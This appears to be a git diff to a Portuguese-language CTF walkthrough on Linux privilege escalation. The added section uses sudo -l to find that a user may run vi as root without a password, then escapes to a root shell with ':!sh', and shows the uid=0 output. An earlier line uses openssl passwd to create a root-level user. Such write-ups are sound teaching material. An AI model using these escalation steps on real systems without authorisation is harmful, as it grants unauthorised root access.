@@ -3,7 +3,7 @@
 A room trata de técnicas comuns de elevação de privilégios em ambientes com sistema operacional baseado em Linux.
 # Execução
 
-## 1 - Ger Connected
+## 1 - Get Connected
 
 Nesse item, apenas deve-se iniciar a VM alvo.
 
@@ -348,3 +348,50 @@ openssl passwd -1 -salt "new" "123"
 As duas últimas questões não tem necessidade respostas, apenas passam informações adicionais, como por exemplo, usar o comando ***su - new***, para mudar para o usuário ***new***, que tem tem privilégios de ***root***.
 
 É importante destacar que o cenário demonstrado, pressupõe que o ambiente já tinha sido explorado e já se tinha senha do usuário ***user7***.
+
+## Escaping vi editor
+
+Nas informações desta task é informado sobre a importância da etapa de enumeração. Como medida inicial, execução do comando ***sudo -l*** para listar possíveis comandos que o usuário pode executar com algum grau de elevação de privilégios.
+
+Conforme indicado na task, alterna-se para o usuário user8. Em seguida, executa-se:
+
+```shell
+user8@polobox:/home/user3$ sudo -l
+Matching Defaults entries for user8 on polobox:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user8 may run the following commands on polobox:
+    (root) NOPASSWD: /usr/bin/vi
+```
+
+Como pode ser observado, o usuário tem permissão para executar com permissão de root o comando vi.
+
+### Misconfigured Binaries and GTFOBins
+
+Durante a enumeração, pode-se encontrar um binário mal configurado ou  mesmo quando se verificar quais binários uma conta de usuário que pode acessar. Um bom lugar para procurar como explorá-los é [GTFOBins](https://gtfobins.github.io/). GTFOBins é uma lista com curadoria de binários Unix que podem ser explorados por um invasor para contornar as restrições de segurança locais. Ele fornece um detalhamento realmente útil de como explorar um binário mal configurado e é o primeiro lugar que se deve procurar para atuar em um CTF ou Pentest.
+
+### Questões:
+
+- a. ***First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"***: *Não há necessidade de resposta*
+
+- b. ***Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?***: *NOPASSWD*
+
+- c. ***So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.***: *Não há necessidade de resposta*
+
+- d. ***Now, type ":!sh" to open a shell!***: *Não há necessidade de resposta*
+
+Sobre a questão ***d***, como o vi foi iniciado com permissões de root, ao iniciar um shell a partir dele, esse shell será um shell com elevação de privilégios.
+
+Ao abrir o ***vi***, basta pressionar ***esc*** para habilitar o modo de comandos, digitar ***!sh*** e teclar enter. Ai será aberto um shell como root.
+
+```shell
+user8@polobox:/home/user3$ sudo vi
+
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+
